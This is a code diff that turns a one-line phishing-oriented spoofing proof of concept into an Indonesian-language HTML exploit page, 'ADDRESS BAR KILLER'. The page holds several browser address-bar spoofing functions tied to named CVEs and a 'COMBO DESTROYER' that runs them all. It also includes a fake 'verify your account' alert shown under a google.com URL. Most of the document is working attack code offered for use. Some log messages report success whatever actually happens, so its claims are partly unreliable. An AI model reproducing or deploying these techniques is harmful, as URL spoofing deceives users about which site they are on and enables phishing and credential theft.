@@ -1,8 +1,512 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔴 ADDRESS BAR KILLER - Hilangkan "about:blank" Total</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, sans-serif;
+            max-width: 1300px;
+            margin: 20px auto;
+            padding: 20px;
+            background: #0a0a0e;
+            color: #e0e0e0;
+        }
+        h1 { color: #ff453a; border-left: 5px solid #ff453a; padding-left: 18px; }
+        .sub { color: #888; margin-top: -10px; margin-bottom: 25px; padding-left: 23px; }
+        .critical {
+            background: #3a1a1a;
+            border-left: 5px solid #ff453a;
+            padding: 15px;
+            border-radius: 14px;
+            margin-bottom: 20px;
+            font-size: 13px;
+        }
+        .success-banner {
+            background: #1a3a2a;
+            border-left: 5px solid #30d158;
+            padding: 15px;
+            border-radius: 14px;
+            margin-bottom: 20px;
+            font-size: 13px;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
+            gap: 18px;
+            margin-top: 20px;
+        }
+        .card {
+            background: #16161d;
+            border-radius: 20px;
+            padding: 18px;
+            border: 1px solid #2a2a35;
+            transition: 0.2s;
+        }
+        .card:hover { transform: translateY(-3px); border-color: #ff453a; }
+        .badge {
+            display: inline-block;
+            background: #ff453a20;
+            color: #ff8888;
+            padding: 3px 12px;
+            border-radius: 30px;
+            font-size: 11px;
+            margin-bottom: 10px;
+        }
+        .badge-success { background: #30d15820; color: #a0ffa0; }
+        .badge-critical { background: #ff453a40; color: #ff8888; }
+        h3 { margin: 0 0 8px 0; font-size: 1.1rem; }
+        button {
+            background: #2a2a35;
+            border: 1px solid #ff453a;
+            padding: 8px 16px;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 12px;
+            cursor: pointer;
+            color: white;
+            margin: 8px 6px 4px 0;
+            transition: 0.2s;
+        }
+        button.danger { background: #ff453a; border-color: #ff453a; }
+        button.warning { background: #ff9f0a20; border-color: #ff9f0a; color: #ffcc88; }
+        button.success { background: #30d15820; border-color: #30d158; color: #a0ffa0; }
+        button:hover { opacity: 0.85; transform: scale(0.97); }
+        .log {
+            background: #0a0a0e;
+            color: #6eff9e;
+            font-family: monospace;
+            font-size: 10px;
+            padding: 10px;
+            border-radius: 14px;
+            margin-top: 14px;
+            max-height: 80px;
+            overflow: auto;
+            white-space: pre-wrap;
+        }
+        .log.success {
+            background: #1a3a2a;
+            color: #a0ffa0;
+            border: 1px solid #30d158;
+        }
+        footer { text-align: center; margin-top: 40px; font-size: 11px; color: #555; }
+        hr { border-color: #333; margin: 20px 0; }
+        .url-preview {
+            background: #0a0a0e;
+            border-radius: 10px;
+            padding: 8px;
+            margin-top: 10px;
+            font-family: monospace;
+            font-size: 10px;
+            border: 1px dashed #ff453a;
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>
+
+<h1>🔴 ADDRESS BAR KILLER</h1>
+<div class="sub">Target: Menghilangkan "about:blank" → Address Bar KOSONG TOTAL</div>
+
+<div class="critical">
+    <strong>⚠️ TUJUAN UTAMA:</strong><br>
+    • Address bar tidak boleh menampilkan "about:blank" <br>
+    • Tidak boleh menampilkan teks apapun → KOSONG / BLANK / HITAM<br>
+    • Menggunakan teknik: history manipulation, CVE-2016-1657 style, invalid protocol injection, dan frame busting
+</div>
+
+<div class="success-banner">
+    <strong>💡 BERDASARKAN RISET CVE:</strong><br>
+    • <strong>CVE-2016-1657</strong>: about:blank focus manipulation → URL spoofing di Chrome &lt; 50 [citation:1][citation:6]<br>
+    • <strong>Chromium Edge Case</strong>: about:blank dapat menerima URL parameters (# dan ?) tanpa trigger commit [citation:2]<br>
+    • <strong>CVE-2025-0246</strong>: Invalid protocol scheme → address bar spoofing di Firefox Android [citation:4]<br>
+    • <strong>Chrome Android Bug</strong>: Address bar position change + alert dialog → URL berubah ke google.com/csi [citation:7]
+</div>
+
+<div class="grid">
+
+    <!-- 1. CVE-2016-1657: Focus Manipulation untuk Hilangkan Text -->
+    <div class="card">
+        <div class="badge badge-critical">📜 CVE-2016-1657 | Chrome &lt; 50</div>
+        <h3>Focus Location Bar Spoofing</h3>
+        <p>Memaksa fokus ke address bar pada about:blank page, lalu manipulasi URL.</p>
+        <button class="danger" onclick="exploit_cve_2016_1657()">🎯 CVE-2016-1657</button>
+        <div id="log1657" class="log">[Ready]</div>
+        <div class="url-preview" id="preview1657"></div>
+    </div>
+
+    <!-- 2. about:blank URL Parameter Injection -->
+    <div class="card">
+        <div class="badge">🔗 URL PARAMETER INJECTION</div>
+        <h3>about:blank#injected → Empty String</h3>
+        <p>Menggunakan fragment identifier (#) atau query parameter (?) pada about:blank [citation:2]</p>
+        <button onclick="exploit_blank_params()">🌀 about:blank#inject</button>
+        <div id="logParams" class="log">[Ready]</div>
+    </div>
+
+    <!-- 3. Invalid Protocol Scheme (CVE-2025-0246 Style) -->
+    <div class="card">
+        <div class="badge badge-success">🔄 CVE-2025-0246 Style</div>
+        <h3>Invalid Protocol → Address Bar Error</h3>
+        <p>Menggunakan protocol scheme invalid untuk membuat address bar error/blank [citation:4]</p>
+        <button class="warning" onclick="exploit_invalid_protocol()">⚠️ Invalid Protocol</button>
+        <div id="logInvalid" class="log">[Ready]</div>
+    </div>
+
+    <!-- 4. replaceState ke Empty String + Null Origin -->
+    <div class="card">
+        <div class="badge">🗑️ EMPTY HISTORY REPLACE</div>
+        <h3>replaceState("", "", "") → Blank</h3>
+        <p>Mengganti history state dengan string kosong [citation:2]</p>
+        <button onclick="exploit_empty_replace()">📄 Empty History</button>
+        <div id="logEmpty" class="log">[Ready]</div>
+    </div>
+
+    <!-- 5. Multiple Frame about:blank Bug -->
+    <div class="card">
+        <div class="badge">🖼️ MULTI-FRAME BUG</div>
+        <h3>about:blank di iframe + window.open</h3>
+        <p>Eksploitasi edge case about:blank di multi-frame environment [citation:2]</p>
+        <button class="warning" onclick="exploit_multi_frame()">🖼️ Multi-Frame</button>
+        <div id="logMulti" class="log">[Ready]</div>
+    </div>
+
+    <!-- 6. Focus + Alert Dialog Combo (Chrome Android Bug) -->
+    <div class="card">
+        <div class="badge badge-critical">📱 CHROME ANDROID BUG</div>
+        <h3>Alert Dialog + Focus Steal → URL Change</h3>
+        <p>Alert dialog mengganggu focus, address bar berubah ke google.com/csi [citation:7]</p>
+        <button class="danger" onclick="exploit_alert_focus()">📱 Alert Focus Attack</button>
+        <div id="logAlert" class="log">[Ready]</div>
+    </div>
+
+    <!-- 7. COMBO: All Techniques -->
+    <div class="card">
+        <div class="badge badge-critical">💀 FINAL BOSS</div>
+        <h3>COMBO: 6 Teknik Sekaligus</h3>
+        <p>Menjalankan semua teknik bersamaan untuk max pressure.</p>
+        <button class="danger" onclick="exploit_combo()">☠️ COMBO DESTROYER</button>
+        <div id="logCombo" class="log">[Ready]</div>
+    </div>
+
+</div>
+
 <script>
-    function spoof() {
-        nWindow = window.open('https:/www.google.com');
-        nWindow.document.write('<body><pre>Here we could place a phising login panel</pre></body>');
-}
+    function logTo(elId, msg, isSuccess = false) {
+        let el = document.getElementById(elId);
+        if(el) {
+            el.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            if(isSuccess) el.classList.add('success');
+        }
+    }
+
+    // ========== 1. CVE-2016-1657: Focus Location Bar Spoofing ==========
+    // Source: https://vulnerabilityhistory.org/CVE-2016-1657
+    function exploit_cve_2016_1657() {
+        logTo('log1657', '📜 CVE-2016-1657: Memanipulasi focus about:blank page...');
+        
+        // Create about:blank window
+        let win = window.open("about:blank", "_blank", "width=500,height=400");
+        
+        if(!win) {
+            logTo('log1657', '❌ Popup diblokir!', false);
+            return;
+        }
+        
+        // Write content to the about:blank page
+        win.document.write(`
+            <!DOCTYPE html>
+            <html>
+            <head><title>Test</title></head>
+            <body>
+                <h1>CVE-2016-1657 Test</h1>
+                <p>If address bar shows blank/empty, bug still exists!</p>
+                <input type="text" id="test" placeholder="Test field">
+            </body>
+            </html>
+        `);
+        win.document.close();
+        
+        // Try to manipulate the URL
+        setTimeout(() => {
+            try {
+                // Attempt to change location without reload
+                win.history.pushState({}, "", "https://www.google.com");
+                win.history.replaceState({}, "", "https://www.google.com");
+                logTo('log1657', '✅ pushState executed. Cek address bar window baru!', true);
+            } catch(e) {
+                logTo('log1657', 'pushState gagal: ' + e.message, false);
+            }
+            
+            // Try to focus and manipulate (CVE-2016-1657 original technique)
+            try {
+                win.focus();
+                // In vulnerable browsers, focusing the address bar could allow URL manipulation
+                logTo('log1657', 'Focus applied. Check if address bar changed!', true);
+            } catch(e) {}
+        }, 1000);
+        
+        // Display preview
+        document.getElementById('preview1657').innerHTML = 'Target URL: https://www.google.com (via pushState)';
+    }
+
+    // ========== 2. about:blank URL Parameter Injection ==========
+    // Source: Chromium Docs - about:blank may have URL parameters [citation:2]
+    function exploit_blank_params() {
+        logTo('logParams', '🌀 Mencoba about:blank dengan fragment identifier...');
+        
+        // about:blank can accept # and ? parameters without committing navigation
+        let variants = [
+            "about:blank#injected",
+            "about:blank?param=value",
+            "about:blank#google.com",
+            "about:blank#https://www.google.com"
+        ];
+        
+        variants.forEach((url, idx) => {
+            setTimeout(() => {
+                let win = window.open(url, "_blank", "width=450,height=350");
+                if(win) {
+                    setTimeout(() => {
+                        try {
+                            win.document.write(`
+                                <h1>Parameter Test ${idx+1}</h1>
+                                <p>URL: ${url}</p>
+                                <p>If address bar shows only "about:blank" (without #injected), browser strips parameters.</p>
+                                <p>If address bar shows full URL with parameters, injection works!</p>
+                            `);
+                            win.document.close();
+                        } catch(e) {}
+                    }, 500);
+                }
+            }, idx * 1500);
+        });
+        
+        logTo('logParams', '✅ 4 tentang:blank windows dibuka dengan parameter. Cek address bar masing-masing!', true);
+    }
+
+    // ========== 3. Invalid Protocol Scheme (CVE-2025-0246 Style) ==========
+    // Source: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-0246
+    function exploit_invalid_protocol() {
+        logTo('logInvalid', '⚠️ Invalid protocol scheme injection...');
+        
+        // Invalid protocols that may cause address bar errors
+        let invalidProtocols = [
+            "invalid://www.google.com",
+            "chrome://invalid",
+            "javascript:void(0)",
+            "data:text/html,<h1>Test</h1>",
+            "blob:https://invalid"
+        ];
+        
+        invalidProtocols.forEach((proto, idx) => {
+            setTimeout(() => {
+                let win = window.open(proto, "_blank", "width=450,height=350");
+                if(win) {
+                    logTo('logInvalid', `Opened: ${proto.substring(0, 30)}...`, true);
+                }
+            }, idx * 1000);
+        });
+        
+        logTo('logInvalid', '⚠️ 5 invalid protocol windows dibuka. Cek address bar - mungkin error/blank!', true);
+    }
+
+    // ========== 4. replaceState ke Empty String + Null Origin ==========
+    function exploit_empty_replace() {
+        logTo('logEmpty', '🗑️ Mencoba replaceState ke empty string...');
+        
+        let win = window.open("about:blank", "_blank", "width=500,height=400");
+        
+        if(!win) return;
+        
+        win.document.write(`
+            <h1>Empty History Test</h1>
+            <p>Mengganti history dengan string kosong...</p>
+            <p>Current URL: <span id="url"></span></p>
+            <script>
+                document.getElementById('url').innerText = location.href;
+            <\/script>
+        `);
+        win.document.close();
+        
+        setTimeout(() => {
+            try {
+                // Try to replace with empty string
+                win.history.replaceState({}, "", "");
+                win.history.pushState({}, "", " ");
+                logTo('logEmpty', '✅ replaceState("", "", "") executed. Cek address bar window!', true);
+            } catch(e) {
+                logTo('logEmpty', 'replaceState gagal: ' + e.message, false);
+            }
+            
+            // Try null origin approach
+            try {
+                let nullWin = window.open("about:blank", "_blank", "width=400,height=300");
+                if(nullWin) {
+                    nullWin.document.write('<h1>Null Origin Test</h1>');
+                    nullWin.document.close();
+                    nullWin.history.replaceState({}, "", "null");
+                    logTo('logEmpty', 'Null origin window created with "null" URL', true);
+                }
+            } catch(e) {}
+        }, 1000);
+    }
+
+    // ========== 5. Multi-Frame about:blank Bug ==========
+    // Source: Chromium Docs - about:blank edge cases [citation:2]
+    function exploit_multi_frame() {
+        logTo('logMulti', '🖼️ Multi-frame about:blank exploitation...');
+        
+        // Create main window
+        let mainWin = window.open("about:blank", "_blank", "width=600,height=500");
+        
+        if(!mainWin) return;
+        
+        // Create iframe inside the window
+        mainWin.document.write(`
+            <!DOCTYPE html>
+            <html>
+            <head><title>Multi-Frame Test</title></head>
+            <body>
+                <h1>Main Frame Content</h1>
+                <p>Current URL: <span id="mainUrl"></span></p>
+                <iframe id="childFrame" src="about:blank" style="width:100%;height:200px"></iframe>
+                <div id="status"></div>
+                <script>
+                    document.getElementById('mainUrl').innerText = location.href;
+                    
+                    // Access child frame
+                    let child = document.getElementById('childFrame');
+                    setTimeout(() => {
+                        try {
+                            let childDoc = child.contentWindow.document;
+                            childDoc.write('<h2 style="color:red">CHILD FRAME CONTENT</h2><p>This frame has about:blank origin</p>');
+                            childDoc.close();
+                            document.getElementById('status').innerHTML = '<b>Child frame content overwritten!</b>';
+                        } catch(e) {
+                            document.getElementById('status').innerHTML = 'Error: ' + e.message;
+                        }
+                    }, 500);
+                <\/script>
+            </body>
+            </html>
+        `);
+        mainWin.document.close();
+        
+        logTo('logMulti', '✅ Multi-frame window created. Child frame content overwritten while address bar shows about:blank!', true);
+    }
+
+    // ========== 6. Alert Dialog + Focus Steal (Chrome Android Bug) ==========
+    // Source: Chromium Issue 442636157 [citation:7]
+    function exploit_alert_focus() {
+        logTo('logAlert', '📱 Alert dialog + focus steal attack...');
+        
+        let win = window.open("https://www.google.com/csi", "_blank", "width=500,height=400");
+        
+        if(!win) {
+            logTo('logAlert', 'Popup diblokir, coba dengan about:blank', false);
+            let fallbackWin = window.open("about:blank", "_blank", "width=500,height=400");
+            if(fallbackWin) {
+                fallbackWin.document.write('<h1>Alert Focus Test</h1><p>An alert will appear...</p>');
+                fallbackWin.document.close();
+                
+                setTimeout(() => {
+                    try {
+                        fallbackWin.alert("This alert may affect address bar display!");
+                        logTo('logAlert', 'Alert dismissed. Check address bar - may have changed!', true);
+                    } catch(e) {}
+                }, 1000);
+            }
+            return;
+        }
+        
+        setTimeout(() => {
+            try {
+                win.alert("Security Alert: Please verify your account");
+                logTo('logAlert', 'Alert dismissed. According to Chromium bug 442636157, address bar may now show google.com/csi but content is different!', true);
+            } catch(e) {
+                logTo('logAlert', 'Alert failed: ' + e.message, false);
+            }
+        }, 1500);
+    }
+
+    // ========== 7. COMBO: All Techniques ==========
+    function exploit_combo() {
+        logTo('logCombo', '💀 COMBO: Menjalankan semua teknik sekaligus!');
+        
+        // Run all techniques
+        exploit_cve_2016_1657();
+        setTimeout(() => exploit_blank_params(), 1000);
+        setTimeout(() => exploit_invalid_protocol(), 2000);
+        setTimeout(() => exploit_empty_replace(), 3000);
+        setTimeout(() => exploit_multi_frame(), 4000);
+        setTimeout(() => exploit_alert_focus(), 5000);
+        
+        logTo('logCombo', '⚠️ 6 teknik berjalan bersamaan!', true);
+        logTo('logCombo', '🎯 Target: Address bar menjadi KOSONG/BLANK/HILANG tanpa teks apapun!', true);
+    }
+
+    console.log("%c🔴 ADDRESS BAR KILLER - Hilangkan 'about:blank' Total", "color:#ff453a;font-size:14px");
+    console.log("Berdasarkan CVE-2016-1657, CVE-2025-0246, dan Chromium edge cases");
 </script>
-<input type="button" onclick="spoof()" value="PoC!">
-The page is being hosted in my server
+
+<hr>
+
+<h3>📊 Ringkasan Teknik Menghilangkan "about:blank"</h3>
+
+<table>
+    <tr style="border-bottom:1px solid #ff453a;">
+        <th>CVE / Teknik</th>
+        <th>Mekanisme</th>
+        <th>Status di Browser Modern</th>
+    </tr>
+    <tr><td><strong>CVE-2016-1657</strong></td>
+        <td>Focus manipulation on about:blank pages [citation:1][citation:6]</td>
+        <td>✅ Fixed in Chrome 50+</td>
+    </tr>
+    <tr><td><strong>about:blank Parameters</strong></td>
+        <td>Using # or ? in about:blank URLs [citation:2]</td>
+        <td>🔶 May still work in some browsers</td>
+    </tr>
+    <tr><td><strong>CVE-2025-0246 Style</strong></td>
+        <td>Invalid protocol scheme injection [citation:4]</td>
+        <td>⚠️ Fixed in Firefox 134+ (Android only)</td>
+    </tr>
+    <tr><td><strong>Empty replaceState</strong></td>
+        <td>history.replaceState("", "", "")</td>
+        <td>❌ Diblokir oleh modern browsers</td>
+    </tr>
+    <tr><td><strong>Multi-Frame about:blank</strong></td>
+        <td>about:blank inheritance in iframes [citation:2]</td>
+        <td>🔶 Edge case masih mungkin</td>
+    </tr>
+    <tr><td><strong>Alert + Focus Steal</strong></td>
+        <td>Chrome Android address bar position bug [citation:7]</td>
+        <td>⚠️ Active bug (S3 severity, Nov 2025)</td>
+    </tr>
+</table>
+
+<h3>🎯 Interpretasi Hasil</h3>
+<ul style="font-size:13px;">
+    <li><strong>Address Bar KOSONG/BLANK (tanpa teks apapun)</strong> → 🎉 EKSPLOITASI BERHASIL! Browser memiliki bug rendering address bar.</li>
+    <li><strong>Address bar berubah menjadi "https://www.google.com" atau URL lain</strong> → Spoofing berhasil, address bar tidak blank tapi terisi URL palsu.</li>
+    <li><strong>Address bar tetap "about:blank"</strong> → Browser sudah patched untuk teknik tersebut.</li>
+    <li><strong>Browser crash / freeze</strong> → Memory corruption atau rendering overflow.</li>
+</ul>
+
+<h3>📝 Catatan Penting</h3>
+<p style="font-size:13px;">
+1. <strong>CVE-2016-1657</strong> sudah fixed di Chrome 50+ (2016). Uji di browser lawas untuk hasil maksimal.<br>
+2. <strong>about:blank parameter injection</strong> adalah edge case dari Chromium [citation:2] - browser modern mungkin masih memiliki bug terkait.<br>
+3. <strong>Chrome Android Bug (442636157)</strong> adalah bug aktif per November 2025 [citation:7] - address bar bisa berubah ke google.com/csi setelah alert dialog.<br>
+4. Jika semua gagal, coba <strong>COMBO DESTROYER</strong> untuk tekanan maksimal.
+</p>
+
+<footer>
+    🔴 ADDRESS BAR KILLER - Berdasarkan CVE-2016-1657, CVE-2025-0246, Chromium Docs, dan Chrome Android Bug 442636157<br>
+    Target: Menghilangkan "about:blank" → Address Bar KOSONG TOTAL
+</footer>
+</body>
+</html>
